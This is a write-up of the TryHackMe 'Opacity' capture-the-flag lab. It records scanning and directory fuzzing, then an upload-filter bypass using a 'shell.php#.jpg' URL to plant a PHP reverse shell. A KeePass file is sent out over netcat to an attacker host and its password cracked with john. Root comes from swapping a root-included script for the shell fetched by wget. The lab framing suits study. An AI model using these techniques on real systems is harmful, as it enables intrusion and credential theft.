```bash
# PLATFORM          . THM
# CTF NAME          . Opacity
# DESCRIPTION       . Opacity is a Boot2Root made for pentesters and cybersecurity enthusiasts.
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/opacity
```

```
sudo nmap -sSVC -T5 -p- 10.10.6.62 -oN opacity
```

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0fee2910d98e8c53e64de3670c6ebee3 (RSA)
|   256 9542cdfc712799392d0049ad1be4cf0e (ECDSA)
|_  256 edfe9c94ca9c086ff25ca6cf4d3c8e5b (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Login
|_Requested resource was login.php
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
```

#### PORT 80

- Nothing interesting and the login form didn't seem vulnerable to SQLi.

- I've decided to fuzz for hidden directories before wasting time on bruteforcing / more SQLi.

```
ffuf -u http://10.10.6.62/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

```
css                     [Status: 301, Size: 312, Words: 20, Lines: 10]
cloud                   [Status: 301, Size: 314, Words: 20, Lines: 10]
```

- In `/cloud` directory, we find a form that is enabling us to upload pictures to the storage solution from a link.

- We can create our own server to serve files for upload purposes ; 

- I tried uploading a `.php` reverse shell but it failed. 
- A `shell.php.jpg` bypassed the filter, but `shell.jpg.php` didn't. 

- At this point, I'm assuming that the shell is checking for the last extension only to be equal to `.jpg`. 

- I was able to bypass this by having the following files in my webserver directory

- `shell.php` - the reverse PHP shell
- `shell.php#.jpg` - the file we're using to tell the Storage Service to look for. 

- This is working because the filter is seeing the `.jpg` at the end, but `#` prevents it from actually getting appended to the filename, resulting in `shell.php` getting downloaded from the server instead.

- External link used to upload the `shell.php` file: `http://IP:8000/shell.php#.jpg`

- After getting a reverse shell, I've been able to locate the first flag in `/home/sysadmin/local.txt`. 

- However, I continued looking for different, out of the ordinary files/permissions/privilege escalation vectors and I came across `dataset.kdbx` when checking `/opt`. 

- After searching the file extension online, I found out that's the file format for the KeePass Password Manager.

- To make this process easier, the owner of the room installed `netcat` on the system, allowing us to transfer the file following the process:

**TARGET**

```
nc -N IP PORT < dataset.kdbx
```

**LOCALHOST**

```
nc -nvlp PORT > dataset.kdbx
```

- I was able to crack it using john as follows

```
/opt/john/run/keepass2john dataset.kdbx > dataset
```

```
/opt/john/run/john -w=/usr/share/wordlists/rockyou.txt dataset
```

```
7{REDACTED}3        (dataset)     
```

- After this, using `keepassxc-cli`, we can dump the content of the `.kdbx` file using

```
keepassxc-cli export dataset.kdbx > creds
```


```
...
<String>
	<Key>Password</Key>
	<Value ProtectInMemory="True">Cl{REDACTED}700</Value>
</String>

<String>
	<Key>UserName</Key>
	<Value>sysadmin</Value>
</String>
...

```

- So we got the credentials for `sysadmin`. We can SSH into the box.

- We know that the files uploaded to the site are being removed very quickly, but I couldn't find a cron scheduled to do this. 

- However, in `/home/sysadmin/scripts/` we find script.php which seems to do exactly that. 

- I assumed this is the same script that's doing the actual cleanup and not a copy and it is running under root or something, judging by the ownership.

```
drwxr-xr-x 2 sysadmin root     4096 Jul 26  2022 lib
-rw-r----- 1 root     sysadmin  519 Jul  8  2022 script.php
```

- However, the script is including the `lib/backup.inc.php` file. It is owned by root, but the directory is owned by us, which means we can delete the file and replace it with another named the same, but with different content.

```
sysadmin@opacity:~/scripts/lib$ rm backup.inc.php 
rm: remove write-protected regular file 'backup.inc.php'? y

sysadmin@opacity:~/scripts/lib$ wget http://{...}:8000/shell.php     

sysadmin@opacity:~/scripts/lib$ mv shell.php backup.inc.php
```

- I've replaced `backup.inc.php` with the same reverse shell used earlier, renamed to `backup.inc.php`.

```
Connection received on 10.10.6.62 35302
# whoami
root
```

- The last flag is in `/root/proof.txt`.

____

**PS**

- After some research, I found out that `pspy` can be used to snoop on processes without root privileges.
- It also detects the `script.php` running.

```
2024/02/11 11:04:01 CMD: UID=0     PID=1888   | /usr/bin/php /home/sysadmin/scripts/script.php 
```